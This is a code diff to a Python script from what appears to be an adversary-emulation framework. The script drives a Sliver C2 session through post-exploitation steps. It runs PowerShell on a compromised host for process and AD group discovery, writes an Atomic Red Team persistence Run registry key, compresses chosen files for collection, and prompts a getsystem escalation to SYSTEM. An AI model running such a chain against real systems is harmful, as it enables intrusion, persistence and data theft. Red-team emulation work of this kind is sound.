@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -69,26 +69,19 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
     confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
-    confirm_action()
-    commands = """
+    commands = rf"""
     Get-Process
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = rf"""
     Get-AdGroup -Filter *
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -114,6 +107,17 @@ async def main():
     confirm_action()
 
     confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 11 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: command_to_execute[/]")
+    console.print(f"  Description: Thing to Run")
+    default_val = "C:\Path\AtomicRedTeam.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for command_to_execute [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: command_to_execute")
+    user_params["command_to_execute"] = user_input
     commands = """
     REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
     """
@@ -145,45 +149,40 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
-    Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Location to save zipped file or folder")
+    default_val = "None"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 14 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: input_file[/]")
+    console.print(f"  Description: Location of file or folder to zip")
+    default_val = "None"
+    user_input = console.input(
+        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: input_file")
+    user_params["input_file"] = user_input
+    commands = rf"""
+    Compress-Archive -Path "{user_params["input_file"]}" -DestinationPath {user_params["output_file"]} -Force
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
     print_finished_message()
 
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 15 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
-    console.print(f"  Description: Target process ID or name for privilege escalation")
-    default_val = ""
-    user_input = console.input(
-        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
-    ) or default_val
-    if not user_input and False:
-        raise ValueError("Missing required parameter: hosting_process")
-    user_params["hosting_process"] = user_input
-
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 15 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: config[/]")
-    console.print(f"  Description: Configuration options for escalation method")
-    default_val = "Service"
-    user_input = console.input(
-        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
-    ) or default_val
-    if not user_input and False:
-        raise ValueError("Missing required parameter: config")
-    user_params["config"] = user_input
-
-    user_params["SessionID"] = sliver_sessionid
-
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
+    console.print("[bold green][MANUAL ACTION REQUIRED][/bold green]")
+    console.print("In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations.")
     confirm_action()
-    try:
-        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
+    sliver_sessionid = await sliver_executor.select_sessions()
 
     confirm_action()
     commands = """
